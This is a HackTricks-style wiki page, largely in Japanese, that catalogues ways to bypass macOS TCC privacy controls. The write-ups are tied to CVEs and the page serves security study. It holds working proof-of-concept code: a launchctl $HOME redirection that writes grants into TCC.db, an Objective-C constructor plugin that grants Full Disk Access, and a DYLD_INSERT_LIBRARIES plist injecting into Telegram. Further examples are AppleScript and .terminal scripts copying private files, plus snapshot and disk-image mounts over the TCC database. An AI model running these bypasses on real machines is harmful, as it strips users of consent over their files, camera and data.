# macOS TCC Bypasses

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}

## 機能別

### 書き込みバイパス

これはバイパスではなく、TCCの動作方法です：**書き込みから保護されていません**。ターミナルがユーザーのデスクトップを読み取るアクセス権を持っていなくても、**そこに書き込むことができます**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** は新しい **ファイル** に追加され、**作成者のアプリ** がそれを読み取るアクセスを得るためのものです。

### TCC ClickJacking

**TCCプロンプトの上にウィンドウを置く** ことで、ユーザーが **それを受け入れる** ようにすることが可能です。PoCは [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** で見つけることができます。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

攻撃者は **任意の名前** (例: Finder, Google Chrome...) のアプリを **`Info.plist`** に作成し、TCCで保護された場所へのアクセスを要求させることができます。ユーザーは、正当なアプリケーションがこのアクセスを要求していると思うでしょう。\
さらに、**正当なアプリをDockから削除し、偽のアプリをその上に置く** ことが可能です。ユーザーが偽のアプリ（同じアイコンを使用できる）をクリックすると、正当なアプリを呼び出し、TCCの権限を要求し、マルウェアを実行させることができ、ユーザーは正当なアプリがアクセスを要求したと信じることになります。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細情報とPoCは以下にあります：

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

デフォルトでは、**SSH経由のアクセスは「フルディスクアクセス」を持っていました**。これを無効にするには、リストに載せておく必要がありますが、無効にすること（リストから削除すること）はその権限を取り除くことにはなりません：

![](<../../../../../.gitbook/assets/image (1077).png>)

ここでは、いくつかの **マルウェアがこの保護を回避できた例** を見つけることができます：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
現在、SSHを有効にするには **フルディスクアクセス** が必要です。
{% endhint %}

### Handle extensions - CVE-2022-26767

属性 **`com.apple.macl`** はファイルに与えられ、**特定のアプリケーションにそれを読む権限を与えます。** この属性は、**ドラッグ＆ドロップ** でファイルをアプリに移動したとき、またはユーザーが **ダブルクリック** して **デフォルトアプリケーション** で開くときに設定されます。

したがって、ユーザーは **悪意のあるアプリを登録** してすべての拡張子を処理させ、Launch Servicesを呼び出して **任意のファイルを開く** ことができます（そのため、悪意のあるファイルはそれを読むアクセスを得ることになります）。

### iCloud

権限 **`com.apple.private.icloud-account-access`** により、**`com.apple.iCloudHelper`** XPCサービスと通信することが可能で、**iCloudトークン** を提供します。

**iMovie** と **Garageband** はこの権限を持っており、他のアプリも許可されていました。

この権限から **iCloudトークンを取得する** ためのエクスプロイトに関する詳細情報は、トークをチェックしてください: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** 権限を持つアプリは、**他のアプリを制御する** ことができます。これは、他のアプリに付与された権限を **悪用する** ことができることを意味します。

Apple Scriptsに関する詳細情報は以下を確認してください：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

例えば、アプリが **`iTerm`** に対して **Automation権限** を持っている場合、この例では **`Terminal`** がiTermにアクセスしています：

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDAを持たないTerminalは、iTermを呼び出し、それを使用してアクションを実行できます：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Over Finder

または、アプリがFinderにアクセスできる場合、次のようなスクリプトを使用できます:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## アプリの動作による

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

ユーザーランドの **tccd デーモン** は **`HOME`** **env** 変数を使用して、TCC ユーザーデータベースにアクセスします: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[この Stack Exchange の投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) によると、TCC デーモンは現在のユーザーのドメイン内で `launchd` を介して実行されているため、**渡されるすべての環境変数を制御することが可能**です。\
したがって、**攻撃者は `$HOME` 環境** 変数を **`launchctl`** で **制御された** **ディレクトリ** を指すように設定し、**TCC** デーモンを **再起動** し、その後 **TCC データベースを直接変更**して、エンドユーザーにプロンプトを表示することなく **すべての TCC 権限を取得**することができます。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - ノート

ノートはTCC保護された場所にアクセスできましたが、ノートが作成されると、これは**保護されていない場所**に**作成されます**。したがって、ノートに保護されたファイルをノートにコピーするように依頼し（つまり、保護されていない場所に）、そのファイルにアクセスすることができます：

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - トランスロケーション

バイナリ`/usr/libexec/lsd`は、ライブラリ`libsecurity_translocate`を使用しており、権限`com.apple.private.nullfs_allow`を持っていたため、**nullfs**マウントを作成でき、**`kTCCServiceSystemPolicyAllFiles`**を使用してすべてのファイルにアクセスできる権限`com.apple.private.tcc.allow`を持っていました。

「Library」にクアランティン属性を追加し、**`com.apple.security.translocation`** XPCサービスを呼び出すことが可能で、その後、Libraryは**`$TMPDIR/AppTranslocation/d/d/Library`**にマッピングされ、Library内のすべてのドキュメントに**アクセス**できるようになりました。

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`**には興味深い機能があります：実行中に、**`~/Music/Music/Media.localized/Automatically Add to Music.localized`**にドロップされたファイルをユーザーの「メディアライブラリ」に**インポート**します。さらに、次のような呼び出しを行います：**`rename(a, b);`** ここで、`a`と`b`は：

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

この**`rename(a, b);`**の動作は**レースコンディション**に対して脆弱であり、`Automatically Add to Music.localized`フォルダ内に偽の**TCC.db**ファイルを置き、新しいフォルダ(b)が作成されるときにファイルをコピーし、削除し、**`~/Library/Application Support/com.apple.TCC`**にポイントすることが可能です。

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`**は基本的に**開いている任意のデータベースがそのパスにコピーされる**ことを意味します。このCVEでは、この制御が悪用され、**SQLiteデータベース**内に**書き込まれ**、そのデータベースが**FDAのTCCデータベースで開かれるプロセスによって開かれる**ことになり、**`SQLITE_SQLLOG_DIR`**を**ファイル名のシンボリックリンク**で悪用し、そのデータベースが**開かれる**と、ユーザーの**TCC.dbが上書きされます**。\
**詳細情報** [**こちらの解説**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **および**[ **こちらのトーク**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s)。

### **SQLITE\_AUTO\_TRACE**

環境変数**`SQLITE_AUTO_TRACE`**が設定されている場合、ライブラリ**`libsqlite3.dylib`**はすべてのSQLクエリを**ログ**し始めます。多くのアプリケーションがこのライブラリを使用していたため、すべてのSQLiteクエリをログに記録することが可能でした。

いくつかのAppleアプリケーションは、このライブラリを使用してTCC保護情報にアクセスしていました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

この**env変数は`Metal`フレームワークによって使用され**、これはさまざまなプログラムの依存関係であり、特に`Music`がFDAを持っています。

次のように設定します: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。`path`が有効なディレクトリであれば、バグがトリガーされ、`fs_usage`を使用してプログラム内で何が起こっているかを見ることができます:

* `path/.dat.nosyncXXXX.XXXXXX`（Xはランダム）という名前のファイルが`open()`されます。
* 1つ以上の`write()`がファイルに内容を書き込みます（これを制御することはできません）。
* `path/.dat.nosyncXXXX.XXXXXX`が`path/name`に`renamed()`されます。

これは一時ファイルの書き込みであり、その後に**`rename(old, new)`**が**安全ではありません。**

安全でない理由は、**古いパスと新しいパスを別々に解決する必要があるため**、これには時間がかかる可能性があり、レースコンディションに対して脆弱です。詳細については、`xnu`関数`renameat_internal()`を確認できます。

{% hint style="danger" %}
基本的に、特権プロセスがあなたが制御するフォルダから名前を変更している場合、RCEを獲得し、異なるファイルにアクセスさせることができるか、またはこのCVEのように、特権アプリが作成したファイルを開いてFDを保存することができます。

名前変更があなたが制御するフォルダにアクセスする場合、ソースファイルを変更したり、FDを持っている間に、宛先ファイル（またはフォルダ）をシンボリックリンクを指すように変更することで、いつでも書き込むことができます。
{% endhint %}

これがCVEでの攻撃でした: たとえば、ユーザーの`TCC.db`を上書きするために、次のことができます:

* `/Users/hacker/ourlink`を作成して`/Users/hacker/Library/Application Support/com.apple.TCC/`を指すようにします。
* ディレクトリ`/Users/hacker/tmp/`を作成します。
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`を設定します。
* このenv変数で`Music`を実行してバグをトリガーします。
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`の`open()`をキャッチします（Xはランダム）。
* ここで、このファイルをライティング用に`open()`し、ファイルディスクリプタを保持します。
* `/Users/hacker/tmp`を`/Users/hacker/ourlink`と**ループ内で原子的に切り替えます**。
* レースウィンドウが非常に狭いため、成功の可能性を最大化するためにこれを行いますが、レースに負けることのデメリットはほとんどありません。
* 少し待ちます。
* 運が良かったかテストします。
* そうでなければ、最初から再実行します。

詳細は[https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)で確認できます。

{% hint style="danger" %}
今、env変数`MTL_DUMP_PIPELINES_TO_JSON_FILE`を使用しようとすると、アプリが起動しません。
{% endhint %}

### Apple Remote Desktop

rootとしてこのサービスを有効にすると、**ARDエージェントはフルディスクアクセスを持ち**、これをユーザーが悪用して新しい**TCCユーザーデータベース**をコピーさせることができます。

## By **NFSHomeDirectory**

TCCは、ユーザーのHOMEフォルダ内のデータベースを使用して、**$HOME/Library/Application Support/com.apple.TCC/TCC.db**でユーザー固有のリソースへのアクセスを制御します。\
したがって、ユーザーが$HOME env変数を**異なるフォルダ**を指すように再起動できれば、ユーザーは**/Library/Application Support/com.apple.TCC/TCC.db**に新しいTCCデータベースを作成し、TCCを騙して任意のTCC権限を任意のアプリに付与させることができます。

{% hint style="success" %}
Appleは、**`NFSHomeDirectory`**属性内のユーザープロファイルに保存された設定を**`$HOME`**の値として使用しているため、この値を変更する権限を持つアプリケーションを侵害すると、TCCバイパスを使用してこのオプションを**武器化**できます。
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**最初のPOC**は、[**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)と[**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)を使用して、ユーザーの**HOME**フォルダを変更します。

1. 対象アプリの_csreq_バイナリを取得します。
2. 必要なアクセス権と_csreq_バイナリを持つ偽の_TCC.db_ファイルを植え付けます。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)を使用してユーザーのディレクトリサービスエントリをエクスポートします。
4. ユーザーのホームディレクトリを変更するためにディレクトリサービスエントリを修正します。
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)を使用して修正されたディレクトリサービスエントリをインポートします。
6. ユーザーの_tccd_を停止し、プロセスを再起動します。

2番目のPOCは、`/usr/libexec/configd`を使用し、`com.apple.private.tcc.allow`に`kTCCServiceSystemPolicySysAdminFiles`の値がありました。\
**`-t`**オプションで**`configd`**を実行することが可能で、攻撃者は**カスタムバンドルをロード**することを指定できました。したがって、エクスプロイトは、ユーザーのホームディレクトリを変更するための**`dsexport`**および**`dsimport`**メソッドを**`configd`コードインジェクション**に置き換えます。

詳細は[**元の報告**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)を確認してください。

## By process injection

プロセス内にコードを注入し、そのTCC権限を悪用するためのさまざまな技術があります:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

さらに、TCCをバイパスするために見つかった最も一般的なプロセスインジェクションは**プラグイン（ライブラリの読み込み）**です。\
プラグインは通常、ライブラリやplistの形で追加のコードであり、**メインアプリケーションによって読み込まれ**、そのコンテキストで実行されます。したがって、メインアプリケーションがTCC制限ファイルへのアクセス権を持っている場合（付与された権限または権利によって）、**カスタムコードもそれを持ちます**。

### CVE-2020-27937 - Directory Utility

アプリケーション`/System/Library/CoreServices/Applications/Directory Utility.app`は、権限**`kTCCServiceSystemPolicySysAdminFiles`**を持ち、**`.daplug`**拡張子のプラグインを読み込み、**ハードンされた**ランタイムを持っていませんでした。

このCVEを武器化するために、**`NFSHomeDirectory`**が**変更され**（以前の権限を悪用して）、ユーザーのTCCデータベースを**引き継ぐ**ことができるようにします。

詳細は[**元の報告**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)を確認してください。

### CVE-2020-29621 - Coreaudiod

バイナリ**`/usr/sbin/coreaudiod`**は、権限`com.apple.security.cs.disable-library-validation`と`com.apple.private.tcc.manager`を持っていました。最初のものは**コードインジェクションを許可**し、2番目は**TCCを管理するアクセスを与え**ました。

このバイナリは、フォルダ`/Library/Audio/Plug-Ins/HAL`から**サードパーティプラグインを読み込む**ことを許可しました。したがって、次のPoCを使用して**プラグインを読み込み、TCC権限を悪用する**ことが可能でした:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### デバイス抽象化レイヤー (DAL) プラグイン

Core Media I/O を介してカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`** を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL` にある **これらのプラグインをプロセス内で読み込みます**（SIP 制限なし）。

そこに一般的な **コンストラクタ** を持つライブラリを保存するだけで **コードを注入** することができます。

いくつかの Apple アプリケーションがこれに対して脆弱でした。

### Firefox

Firefox アプリケーションは `com.apple.security.cs.disable-library-validation` と `com.apple.security.cs.allow-dyld-environment-variables` の権限を持っていました：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Fore more info about how to easily exploit this [**check the original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` は **`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** の権限を持っており、プロセス内にコードを注入し、TCCの権限を使用することができました。

### CVE-2023-26818 - Telegram

Telegram は **`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** の権限を持っていたため、カメラでの録画などの **権限にアクセスするために悪用する** ことが可能でした。ペイロードは [**writeupで見つけることができます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

環境変数を使用してライブラリをロードする方法に注意してください。**カスタムplist** が作成され、このライブラリを注入するために **`launchctl`** が使用されました：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## By open invocations

**`open`**をサンドボックス化された状態でも呼び出すことが可能です。

### Terminal Scripts

技術者が使用するコンピュータでは、ターミナルに**フルディスクアクセス (FDA)**を与えることが一般的です。そして、それを使用して**`.terminal`**スクリプトを呼び出すことが可能です。

**`.terminal`**スクリプトは、**`CommandString`**キーに実行するコマンドを含むplistファイルです：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmp のような場所にターミナルスクリプトを書き込み、次のようなコマンドで起動することができます:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## マウントによる

### CVE-2020-9771 - mount\_apfs TCC バイパスと特権昇格

**任意のユーザー**（特権のないユーザーも含む）は、タイムマシンのスナップショットを作成してマウントし、そのスナップショットの**すべてのファイルにアクセス**できます。\
必要な**唯一の特権**は、使用されるアプリケーション（`Terminal`など）が**フルディスクアクセス**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つことであり、これは管理者によって付与される必要があります。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

より詳細な説明は[**元のレポートで見つけることができます**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - TCCファイルの上にマウント

TCC DBファイルが保護されていても、新しいTCC.dbファイルを**ディレクトリの上にマウントする**ことが可能でした：

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

ツール **`/usr/sbin/asr`** は、TCC保護を回避してディスク全体をコピーし、別の場所にマウントすることを可能にしました。

### Location Services

**`/var/db/locationd/clients.plist`** に第三のTCCデータベースがあり、**位置情報サービスにアクセスすることを許可されたクライアント**を示します。\
フォルダ **`/var/db/locationd/` はDMGマウントから保護されていなかった**ため、自分のplistをマウントすることが可能でした。

## By startup apps

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## By grep

いくつかの場面で、ファイルはメール、電話番号、メッセージなどの機密情報を保護されていない場所に保存します（これはAppleにとって脆弱性と見なされます）。

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

これはもう機能しませんが、[**過去には機能していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

別の方法として[**CoreGraphicsイベント**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)を使用します：

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
